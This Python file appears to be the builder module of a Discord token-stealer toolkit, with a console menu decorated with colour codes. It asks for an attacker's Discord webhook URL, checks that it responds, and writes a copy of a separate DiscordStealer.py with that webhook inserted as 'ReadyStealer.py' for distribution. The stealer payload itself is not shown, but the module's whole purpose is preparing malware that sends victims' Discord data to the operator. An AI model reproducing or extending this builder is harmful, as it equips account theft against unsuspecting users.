from config.settings import *

BaseDIR = os.path.dirname(os.path.abspath(__file__))
StealerPath = os.path.join(BaseDIR, "DiscordStealer.py")

MainDIR = os.path.abspath(os.path.join(BaseDIR, '..', '..'))
destination = os.path.join(MainDIR, "ReadyStealer.py")

def UpdateWebhook(NewUrl):
    if not os.path.exists(StealerPath):
        print("")
        print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} File not found : {Style.RESET_ALL}{StealerPath}")
        time.sleep(2)
        return False

    try:
        with open(StealerPath, "r") as f:
            Lines = f.readlines()

        with open(destination, "w") as f:
            for line in Lines:
                if line.strip().startswith("webhookUrl ="):
                    f.write(f'webhookUrl = "{NewUrl}"\n')
                else:
                    f.write(line)
    except Exception:
        print("")
        print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Error creating stealer{Style.RESET_ALL}")
        time.sleep(2)
        return False

    return True

def ConfigStealer():
        os.system("cls")
        Slow(DiscordBanner)
        time.sleep(1.5)
        os.system("cls")
        print(f"{bracketopen}!{bracketclosed} {Fore.GREEN}Discord stealer{Style.RESET_ALL}")
        print("")
        WebhookUrl = input(f"{bracketopen}>{bracketclosed} {Fore.GREEN}Webhook url -> {Style.RESET_ALL}")

        try:
            res = requests.get(WebhookUrl)

            if not res.status_code in SuccesStatus:
                print("")
                print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Invalid webhook url{Style.RESET_ALL}")
                time.sleep(2)
                return
            
            WebhookUpdate = UpdateWebhook(WebhookUrl)

            if not WebhookUpdate:
                return
            
            print(f"{bracketopen}~{bracketclosed} {Fore.GREEN}Creating stealer... {Style.RESET_ALL}")
            time.sleep(1.5)
            
            print("")
            print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
            time.sleep(0.05)
            print(f"{bracketopen2}{Fore.GREEN}+{Style.RESET_ALL}{bracketclosed2}{Fore.GREEN} Created stealer : {Style.RESET_ALL}{destination}")
            time.sleep(0.05)
            print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")

            print("")
            print(f"{bracketopen}{Fore.WHITE}01{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Main Menu{Style.RESET_ALL}")
            print(f"{bracketopen}{Fore.WHITE}02{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Exit{Style.RESET_ALL}")
            print("")

            Command = input(f"""{Fore.GREEN} ┌──({Fore.WHITE}{Username}{Fore.GREEN})─[{Fore.WHITE}~/{System}/{PcName}{Fore.GREEN}]
 └─{Fore.WHITE}$ {Style.RESET_ALL}""")

            if Command == "1" or Command == "01":
                pass
            elif Command == "2" or Command == "02":
                sys.exit()
            else:
                pass
            
        except Exception:
            print("")
            print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Error creating stealer{Style.RESET_ALL}")
            time.sleep(2)